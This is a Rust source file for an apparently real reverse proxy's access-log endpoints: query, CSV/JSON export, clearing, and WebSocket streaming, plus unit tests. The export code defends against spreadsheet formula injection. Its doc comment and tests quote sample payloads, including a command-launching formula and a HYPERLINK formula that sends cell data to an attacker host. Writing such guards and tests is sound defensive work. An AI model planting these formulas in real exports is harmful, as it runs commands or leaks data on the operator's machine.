//! Access log query, export, clear, and live WebSocket streaming endpoints.
//!
//! Reads from the persistent SQLite-backed [`crate::log_store::LogStore`] when
//! present and falls back to the in-process [`LogBuffer`] otherwise.

use std::sync::Arc;

use axum::extract::ws::{Message, WebSocket, WebSocketUpgrade};
use axum::extract::{Extension, Query};
use axum::response::IntoResponse;
use axum::Json;
use futures_util::{SinkExt, StreamExt};
use http::header;
use serde::{Deserialize, Serialize};
use tokio::sync::broadcast;

use crate::error::{json_data, ApiError};
use crate::server::AppState;

/// A single access log entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogEntry {
    /// Monotonic entry id assigned at push time.
    pub id: u64,
    /// RFC 3339 timestamp of the request.
    pub timestamp: String,
    /// HTTP method.
    pub method: String,
    /// Request path (including query string).
    pub path: String,
    /// Host header / route hostname.
    pub host: String,
    /// Response HTTP status.
    pub status: u16,
    /// Total request-to-response latency (ms).
    pub latency_ms: u64,
    /// Backend address that served the request.
    pub backend: String,
    /// Optional error text for failed requests.
    pub error: Option<String>,
    /// Client IP address (from socket or X-Forwarded-For).
    #[serde(default)]
    pub client_ip: String,
    /// Whether the client IP was extracted from X-Forwarded-For header.
    #[serde(default)]
    pub is_xff: bool,
    /// The direct TCP peer IP when XFF is used (the forwarding proxy's IP).
    #[serde(default)]
    pub xff_proxy_ip: String,
    /// Request source identifier (e.g., "loadtest" from X-Lorica-Source header).
    #[serde(default)]
    pub source: String,
    /// Unique request ID for end-to-end tracing.
    #[serde(default)]
    pub request_id: String,
}

/// Thread-safe in-memory ring buffer for access logs with real-time broadcast.
pub struct LogBuffer {
    entries: tokio::sync::RwLock<LogBufferInner>,
    /// Broadcast channel for real-time WebSocket subscribers.
    tx: broadcast::Sender<LogEntry>,
}

struct LogBufferInner {
    buf: Vec<LogEntry>,
    capacity: usize,
    next_id: u64,
    /// Write position in the circular buffer.
    write_pos: usize,
    /// Total entries currently stored (up to capacity).
    len: usize,
}

impl LogBuffer {
    /// Build a ring buffer holding up to `capacity` entries plus a 2048-slot broadcast channel.
    pub fn new(capacity: usize) -> Self {
        assert!(capacity > 0, "LogBuffer capacity must be > 0");
        let (tx, _) = broadcast::channel(2048);
        Self {
            entries: tokio::sync::RwLock::new(LogBufferInner {
                buf: Vec::with_capacity(capacity),
                capacity,
                next_id: 1,
                write_pos: 0,
                len: 0,
            }),
            tx,
        }
    }

    /// Push a new log entry into the ring buffer and broadcast to WebSocket subscribers.
    pub async fn push(&self, mut entry: LogEntry) {
        let mut inner = self.entries.write().await;
        entry.id = inner.next_id;
        inner.next_id += 1;

        let entry_clone = entry.clone();

        if inner.buf.len() < inner.capacity {
            inner.buf.push(entry);
        } else {
            let pos = inner.write_pos;
            inner.buf[pos] = entry;
        }
        inner.write_pos = (inner.write_pos + 1) % inner.capacity;
        if inner.len < inner.capacity {
            inner.len += 1;
        }

        // Broadcast to WebSocket subscribers (ignore if no receivers)
        let _ = self.tx.send(entry_clone);
    }

    /// Subscribe to the live broadcast stream of newly pushed entries.
    pub fn subscribe(&self) -> broadcast::Receiver<LogEntry> {
        self.tx.subscribe()
    }

    /// Return all entries in chronological order (oldest first).
    pub async fn snapshot(&self) -> Vec<LogEntry> {
        let inner = self.entries.read().await;
        if inner.len < inner.capacity {
            // Buffer not yet full - entries are in order from index 0
            inner.buf.clone()
        } else {
            // Buffer is full - read from write_pos (oldest) wrapping around
            let mut result = Vec::with_capacity(inner.capacity);
            for i in 0..inner.capacity {
                let idx = (inner.write_pos + i) % inner.capacity;
                result.push(inner.buf[idx].clone());
            }
            result
        }
    }

    /// Drop every buffered entry and reset the write position.
    pub async fn clear(&self) {
        let mut inner = self.entries.write().await;
        inner.buf.clear();
        inner.write_pos = 0;
        inner.len = 0;
    }
}

/// Query parameters for the logs endpoint.
#[derive(Debug, Clone, Deserialize)]
pub struct LogsQuery {
    /// Filter by route hostname.
    pub route: Option<String>,
    /// Filter by HTTP status code.
    pub status: Option<u16>,
    /// Filter by minimum status code.
    pub status_min: Option<u16>,
    /// Filter by maximum status code.
    pub status_max: Option<u16>,
    /// Filter by start time (ISO 8601 / RFC 3339).
    pub time_from: Option<String>,
    /// Filter by end time (ISO 8601 / RFC 3339).
    pub time_to: Option<String>,
    /// Filter by client IP (prefix match).
    pub client_ip: Option<String>,
    /// Search text across method, path, host, backend, error fields.
    pub search: Option<String>,
    /// Maximum number of entries to return (default 200).
    pub limit: Option<usize>,
    /// Return entries after this ID (for pagination).
    pub after_id: Option<u64>,
}

#[derive(Serialize)]
struct LogsResponse {
    entries: Vec<LogEntry>,
    total: usize,
}

/// GET /api/v1/logs - return access log entries matching the supplied filters.
pub async fn get_logs(
    Extension(state): Extension<AppState>,
    Query(params): Query<LogsQuery>,
) -> Result<Json<serde_json::Value>, ApiError> {
    if let Some(ref store) = state.log_store {
        // SQLite read off the tokio worker (audit M-7 / backlog #23) :
        // a contended WAL write can block the connection mutex for up
        // to `busy_timeout` (5 s), which would otherwise stall the
        // entire reactor for the duration.
        let store = Arc::clone(store);
        let params_owned = params.clone();
        let (entries, total) = tokio::task::spawn_blocking(move || store.query(&params_owned))
            .await
            .map_err(|e| ApiError::Internal(format!("log query join failed: {e}")))?
            .map_err(|e| ApiError::Internal(format!("log query failed: {e}")))?;
        return Ok(json_data(LogsResponse { entries, total }));
    }

    let all_entries = state.log_buffer.snapshot().await;
    let limit = params.limit.unwrap_or(200).min(10_000);

    let filtered: Vec<LogEntry> = all_entries
        .into_iter()
        .filter(|e| {
            if let Some(after_id) = params.after_id {
                if e.id <= after_id {
                    return false;
                }
            }
            if let Some(ref route) = params.route {
                if !e.host.contains(route.as_str()) {
                    return false;
                }
            }
            if let Some(status) = params.status {
                if e.status != status {
                    return false;
                }
            }
            if let Some(min) = params.status_min {
                if e.status < min {
                    return false;
                }
            }
            if let Some(max) = params.status_max {
                if e.status > max {
                    return false;
                }
            }
            if let Some(ref time_from) = params.time_from {
                if e.timestamp.as_str() < time_from.as_str() {
                    return false;
                }
            }
            if let Some(ref time_to) = params.time_to {
                if e.timestamp.as_str() > time_to.as_str() {
                    return false;
                }
            }
            if let Some(ref ip) = params.client_ip {
                if !e.client_ip.starts_with(ip.as_str()) {
                    return false;
                }
            }
            if let Some(ref search) = params.search {
                let s = search.to_lowercase();
                let matches = e.method.to_lowercase().contains(&s)
                    || e.path.to_lowercase().contains(&s)
                    || e.host.to_lowercase().contains(&s)
                    || e.backend.to_lowercase().contains(&s)
                    || e.error
                        .as_ref()
                        .is_some_and(|err| err.to_lowercase().contains(&s));
                if !matches {
                    return false;
                }
            }
            true
        })
        .collect();

    let total = filtered.len();
    // Return last N entries (most recent) respecting the limit
    let entries: Vec<LogEntry> = if filtered.len() > limit {
        filtered[filtered.len() - limit..].to_vec()
    } else {
        filtered
    };

    Ok(json_data(LogsResponse { entries, total }))
}

/// Query parameters for the log export endpoint.
#[derive(Debug, Deserialize)]
pub struct LogExportQuery {
    /// Filter by route hostname.
    pub route: Option<String>,
    /// Filter by HTTP status code.
    pub status: Option<u16>,
    /// Filter by minimum status code.
    pub status_min: Option<u16>,
    /// Filter by maximum status code.
    pub status_max: Option<u16>,
    /// Filter by start time (ISO 8601 / RFC 3339).
    pub time_from: Option<String>,
    /// Filter by end time (ISO 8601 / RFC 3339).
    pub time_to: Option<String>,
    /// Filter by client IP (prefix match).
    pub client_ip: Option<String>,
    /// Search text across method, path, host, backend, error fields.
    pub search: Option<String>,
    /// Export format: "csv" (default) or "json".
    pub format: Option<String>,
}

impl LogExportQuery {
    /// Convert to a LogsQuery for reuse with the store query method.
    fn to_logs_query(&self) -> LogsQuery {
        LogsQuery {
            route: self.route.clone(),
            status: self.status,
            status_min: self.status_min,
            status_max: self.status_max,
            time_from: self.time_from.clone(),
            time_to: self.time_to.clone(),
            client_ip: self.client_ip.clone(),
            search: self.search.clone(),
            limit: None,
            after_id: None,
        }
    }
}

/// Escape a field value for CSV output (RFC 4180) AND defuse
/// spreadsheet formula injection.
///
/// RFC 4180 covers parsing safety (quote fields containing `"`, `,`,
/// `\n`, `\r`). It does NOT cover the OWASP "CSV injection" / "formula
/// injection" attack class : Excel / LibreOffice / Google Sheets
/// auto-evaluate any cell whose first character is `=`, `+`, `-`, `@`,
/// tab, or CR. An attacker who lands a payload in any access-log
/// field that the operator later exports (request `path`, `host`,
/// `error`, `client_ip`) plants `=cmd|'/c calc'!A1` or
/// `=HYPERLINK("http://attacker/?x="&A1,"click")` ; opening the CSV
/// in a spreadsheet auto-runs the formula against the operator's
/// trust context. The fix is a leading apostrophe : Excel and the
/// Calc/Sheets clones treat `'=...` as a literal text cell. The
/// apostrophe itself is consumed by the spreadsheet parser, so a
/// human-readable export still shows `=...` in the rendered cell.
/// v1.5.2 audit M-2.
fn csv_escape(s: &str) -> String {
    let needs_formula_guard = s
        .as_bytes()
        .first()
        .is_some_and(|b| matches!(b, b'=' | b'+' | b'-' | b'@' | b'\t' | b'\r'));
    let needs_quoting = s.contains('"') || s.contains(',') || s.contains('\n') || s.contains('\r');
    match (needs_formula_guard, needs_quoting) {
        (false, false) => s.to_string(),
        (true, false) => format!("'{s}"),
        (false, true) => format!("\"{}\"", s.replace('"', "\"\"")),
        (true, true) => format!("\"'{}\"", s.replace('"', "\"\"")),
    }
}

/// Maximum number of entries for a single export request.
const EXPORT_MAX_ENTRIES: usize = 100_000;

/// GET /api/v1/logs/export - download matching access logs as CSV (default) or JSON.
pub async fn export_logs(
    Extension(state): Extension<AppState>,
    Query(params): Query<LogExportQuery>,
) -> Result<impl IntoResponse, ApiError> {
    let format = params.format.as_deref().unwrap_or("csv").to_lowercase();

    if format != "csv" && format != "json" {
        return Err(ApiError::BadRequest(
            "format must be \"csv\" or \"json\"".into(),
        ));
    }

    let logs_query = params.to_logs_query();

    // Collect entries from the persistent store or in-memory buffer.
    let entries: Vec<LogEntry> = if let Some(ref store) = state.log_store {
        // Off the tokio worker - the export query can scan up to
        // EXPORT_MAX_ENTRIES (10 000) rows under WAL contention.
        let store = Arc::clone(store);
        let q = logs_query.clone();
        tokio::task::spawn_blocking(move || store.query_export(&q, EXPORT_MAX_ENTRIES))
            .await
            .map_err(|e| ApiError::Internal(format!("log export join failed: {e}")))?
            .map_err(|e| ApiError::Internal(format!("log export query failed: {e}")))?
    } else {
        // Fallback: filter in-memory buffer (same logic as get_logs but without limit).
        let all = state.log_buffer.snapshot().await;
        all.into_iter()
            .filter(|e| {
                if let Some(ref route) = logs_query.route {
                    if !e.host.contains(route.as_str()) {
                        return false;
                    }
                }
                if let Some(status) = logs_query.status {
                    if e.status != status {
                        return false;
                    }
                }
                if let Some(min) = logs_query.status_min {
                    if e.status < min {
                        return false;
                    }
                }
                if let Some(max) = logs_query.status_max {
                    if e.status > max {
                        return false;
                    }
                }
                if let Some(ref time_from) = logs_query.time_from {
                    if e.timestamp.as_str() < time_from.as_str() {
                        return false;
                    }
                }
                if let Some(ref time_to) = logs_query.time_to {
                    if e.timestamp.as_str() > time_to.as_str() {
                        return false;
                    }
                }
                if let Some(ref search) = logs_query.search {
                    let s = search.to_lowercase();
                    let matches = e.method.to_lowercase().contains(&s)
                        || e.path.to_lowercase().contains(&s)
                        || e.host.to_lowercase().contains(&s)
                        || e.backend.to_lowercase().contains(&s)
                        || e.error
                            .as_ref()
                            .is_some_and(|err| err.to_lowercase().contains(&s));
                    if !matches {
                        return false;
                    }
                }
                true
            })
            .take(EXPORT_MAX_ENTRIES)
            .collect()
    };

    let today = chrono::Utc::now().format("%Y-%m-%d").to_string();

    if format == "json" {
        let body = serde_json::to_string(&entries)
            .map_err(|e| ApiError::Internal(format!("JSON serialization failed: {e}")))?;
        let filename = format!("lorica-logs-{today}.json");
        Ok((
            [
                (header::CONTENT_TYPE, "application/json".to_string()),
                (
                    header::CONTENT_DISPOSITION,
                    format!("attachment; filename=\"{filename}\""),
                ),
            ],
            body,
        ))
    } else {
        let mut csv = String::with_capacity(entries.len() * 120);
        csv.push_str(
            "timestamp,method,path,host,status,latency_ms,backend,client_ip,error,request_id\n",
        );
        for e in &entries {
            csv.push_str(&csv_escape(&e.timestamp));
            csv.push(',');
            csv.push_str(&csv_escape(&e.method));
            csv.push(',');
            csv.push_str(&csv_escape(&e.path));
            csv.push(',');
            csv.push_str(&csv_escape(&e.host));
            csv.push(',');
            csv.push_str(&e.status.to_string());
            csv.push(',');
            csv.push_str(&e.latency_ms.to_string());
            csv.push(',');
            csv.push_str(&csv_escape(&e.backend));
            csv.push(',');
            csv.push_str(&csv_escape(&e.client_ip));
            csv.push(',');
            csv.push_str(&csv_escape(e.error.as_deref().unwrap_or("")));
            csv.push(',');
            csv.push_str(&csv_escape(&e.request_id));
            csv.push('\n');
        }
        let filename = format!("lorica-logs-{today}.csv");
        Ok((
            [
                (header::CONTENT_TYPE, "text/csv; charset=utf-8".to_string()),
                (
                    header::CONTENT_DISPOSITION,
                    format!("attachment; filename=\"{filename}\""),
                ),
            ],
            csv,
        ))
    }
}

/// DELETE /api/v1/logs - empty both the in-memory ring buffer and the persistent store.
pub async fn clear_logs(
    Extension(state): Extension<AppState>,
) -> Result<Json<serde_json::Value>, ApiError> {
    state.log_buffer.clear().await;
    if let Some(ref store) = state.log_store {
        // `DELETE FROM access_logs` rewrites the WAL and can take a
        // few seconds on a busy DB - off the tokio worker.
        let store = Arc::clone(store);
        tokio::task::spawn_blocking(move || store.clear())
            .await
            .map_err(|e| ApiError::Internal(format!("log clear join failed: {e}")))?
            .map_err(|e| ApiError::Internal(format!("log clear failed: {e}")))?;
    }
    Ok(json_data(serde_json::json!({ "message": "logs cleared" })))
}

/// GET /api/v1/logs/ws - WebSocket endpoint for real-time log streaming.
///
/// Each new log entry is broadcast to all connected WebSocket clients as JSON.
/// No authentication required on the WebSocket upgrade itself (the session
/// cookie is validated by the middleware layer before reaching this handler).
pub async fn logs_ws(
    ws: WebSocketUpgrade,
    Extension(state): Extension<AppState>,
) -> impl IntoResponse {
    let rx = state.log_buffer.subscribe();
    ws.on_upgrade(move |socket| handle_log_stream(socket, rx))
}

/// Hard ceiling on cumulative per-connection log drops before we
/// close the WebSocket with a Policy Violation (1008). Protects
/// Lorica from stuck-client backpressure amplification : a client
/// that never reads cannot hold on to a broadcast slot forever.
const LOG_WS_CLOSE_ON_DROPS: u64 = 1000;

async fn handle_log_stream(socket: WebSocket, mut rx: broadcast::Receiver<LogEntry>) {
    use axum::extract::ws::CloseCode;
    use axum::extract::ws::CloseFrame;
    let (mut sender, mut receiver) = socket.split();

    // Forward broadcast entries to the WebSocket client. The
    // broadcast channel is bounded at the sender side (see
    // `LogBuffer::new`) ; when a slow subscriber cannot keep up,
    // the receiver gets `RecvError::Lagged(n)` carrying the number
    // of messages it missed. We surface that as a Prometheus
    // counter (`lorica_logs_ws_dropped_total`) and, if a single
    // connection racks up more than `LOG_WS_CLOSE_ON_DROPS` drops,
    // close it with WS code 1008 (Policy Violation) so the kernel
    // send buffer cannot be used as an amplifier.
    let send_task = tokio::spawn(async move {
        let mut drops: u64 = 0;
        loop {
            match rx.recv().await {
                Ok(entry) => {
                    if let Ok(json) = serde_json::to_string(&entry) {
                        if sender.send(Message::Text(json)).await.is_err() {
                            break; // Client disconnected
                        }
                    }
                }
                Err(broadcast::error::RecvError::Lagged(n)) => {
                    drops = drops.saturating_add(n);
                    crate::metrics::inc_logs_ws_dropped("slow_client", n);
                    tracing::warn!(
                        skipped = n,
                        total_drops = drops,
                        "log WebSocket subscriber lagged"
                    );
                    if drops >= LOG_WS_CLOSE_ON_DROPS {
                        // Best-effort close frame. Ignore error :
                        // the send path is already wedged so we'll
                        // just hit the Err arm next and exit.
                        let _ = sender
                            .send(Message::Close(Some(CloseFrame {
                                code: 1008 as CloseCode,
                                reason: "log stream too slow".into(),
                            })))
                            .await;
                        break;
                    }
                    continue;
                }
                Err(broadcast::error::RecvError::Closed) => break,
            }
        }
    });

    // Consume incoming messages (ping/pong, close) but don't process them
    let recv_task = tokio::spawn(async move {
        while let Some(Ok(msg)) = receiver.next().await {
            if matches!(msg, Message::Close(_)) {
                break;
            }
        }
    });

    // Wait for either task to finish
    tokio::select! {
        _ = send_task => {}
        _ = recv_task => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_log_buffer_push_and_snapshot() {
        let buf = LogBuffer::new(3);

        for i in 1..=3 {
            buf.push(LogEntry {
                id: 0,
                timestamp: format!("2026-01-0{i}T00:00:00Z"),
                method: "GET".into(),
                path: format!("/path{i}"),
                host: "example.com".into(),
                status: 200,
                latency_ms: 10,
                backend: "10.0.0.1:8080".into(),
                error: None,
                client_ip: String::new(),
                is_xff: false,
                xff_proxy_ip: String::new(),
                source: String::new(),
                request_id: String::new(),
            })
            .await;
        }

        let snap = buf.snapshot().await;
        assert_eq!(snap.len(), 3);
        assert_eq!(snap[0].id, 1);
        assert_eq!(snap[2].id, 3);
    }

    #[tokio::test]
    async fn test_log_buffer_ring_overflow() {
        let buf = LogBuffer::new(3);

        for i in 1..=5 {
            buf.push(LogEntry {
                id: 0,
                timestamp: format!("2026-01-0{i}T00:00:00Z"),
                method: "GET".into(),
                path: format!("/path{i}"),
                host: "example.com".into(),
                status: 200,
                latency_ms: 10,
                backend: "10.0.0.1:8080".into(),
                error: None,
                client_ip: String::new(),
                is_xff: false,
                xff_proxy_ip: String::new(),
                source: String::new(),
                request_id: String::new(),
            })
            .await;
        }

        let snap = buf.snapshot().await;
        assert_eq!(snap.len(), 3);
        // Should contain entries 3, 4, 5 (oldest first)
        assert_eq!(snap[0].id, 3);
        assert_eq!(snap[1].id, 4);
        assert_eq!(snap[2].id, 5);
    }

    #[test]
    fn test_csv_escape_plain() {
        assert_eq!(csv_escape("hello"), "hello");
    }

    #[test]
    fn test_csv_escape_with_comma() {
        assert_eq!(csv_escape("a,b"), "\"a,b\"");
    }

    #[test]
    fn test_csv_escape_with_quotes() {
        assert_eq!(csv_escape("say \"hi\""), "\"say \"\"hi\"\"\"");
    }

    #[test]
    fn test_csv_escape_with_newline() {
        assert_eq!(csv_escape("line1\nline2"), "\"line1\nline2\"");
    }

    // v1.5.2 audit M-2 : OWASP CSV / formula injection guard.

    #[test]
    fn test_csv_escape_formula_equals_gets_apostrophe_guard() {
        assert_eq!(csv_escape("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1");
    }

    #[test]
    fn test_csv_escape_formula_plus_gets_apostrophe_guard() {
        assert_eq!(csv_escape("+1+1"), "'+1+1");
    }

    #[test]
    fn test_csv_escape_formula_minus_gets_apostrophe_guard() {
        // SUM-prefixed payloads ; bare leading minus is also evaluated
        // as a formula by Excel.
        assert_eq!(csv_escape("-2+3"), "'-2+3");
    }

    #[test]
    fn test_csv_escape_formula_at_gets_apostrophe_guard() {
        // Excel `@` is the implicit-intersection operator, can pivot
        // into a formula context on some versions.
        assert_eq!(csv_escape("@SUM(A1)"), "'@SUM(A1)");
    }

    #[test]
    fn test_csv_escape_formula_tab_gets_apostrophe_guard() {
        assert_eq!(csv_escape("\t=1"), "'\t=1");
    }

    #[test]
    fn test_csv_escape_formula_with_comma_double_wrapped() {
        // Both formula guard AND quote-wrap : `=A,B` needs the
        // apostrophe inside the RFC 4180 quote wrap.
        assert_eq!(csv_escape("=A,B"), "\"'=A,B\"");
    }

    #[test]
    fn test_csv_escape_legitimate_dash_inside_field_unaffected() {
        // Only the LEADING char triggers the formula guard. A dash
        // anywhere else is left alone (e.g. ISO timestamps).
        assert_eq!(csv_escape("2026-04-26T12:00:00Z"), "2026-04-26T12:00:00Z");
    }

    #[test]
    fn test_csv_escape_empty_field_unaffected() {
        assert_eq!(csv_escape(""), "");
    }

    #[test]
    fn test_log_export_query_to_logs_query() {
        let export = LogExportQuery {
            route: Some("example.com".into()),
            status: None,
            status_min: Some(200),
            status_max: Some(299),
            time_from: Some("2026-01-01T00:00:00Z".into()),
            time_to: Some("2026-01-02T00:00:00Z".into()),
            client_ip: None,
            search: None,
            format: Some("csv".into()),
        };
        let lq = export.to_logs_query();
        assert_eq!(lq.route.as_deref(), Some("example.com"));
        assert_eq!(lq.status_min, Some(200));
        assert_eq!(lq.status_max, Some(299));
        assert_eq!(lq.time_from.as_deref(), Some("2026-01-01T00:00:00Z"));
        assert_eq!(lq.time_to.as_deref(), Some("2026-01-02T00:00:00Z"));
        assert!(lq.limit.is_none());
        assert!(lq.after_id.is_none());
    }

    #[tokio::test]
    async fn test_log_buffer_clear() {
        let buf = LogBuffer::new(10);
        buf.push(LogEntry {
            id: 0,
            timestamp: "2026-01-01T00:00:00Z".into(),
            method: "GET".into(),
            path: "/".into(),
            host: "example.com".into(),
            status: 200,
            latency_ms: 5,
            backend: "10.0.0.1:8080".into(),
            error: None,
            client_ip: String::new(),
            is_xff: false,
            xff_proxy_ip: String::new(),
            source: String::new(),
            request_id: String::new(),
        })
        .await;

        assert_eq!(buf.snapshot().await.len(), 1);
        buf.clear().await;
        assert_eq!(buf.snapshot().await.len(), 0);
    }
}
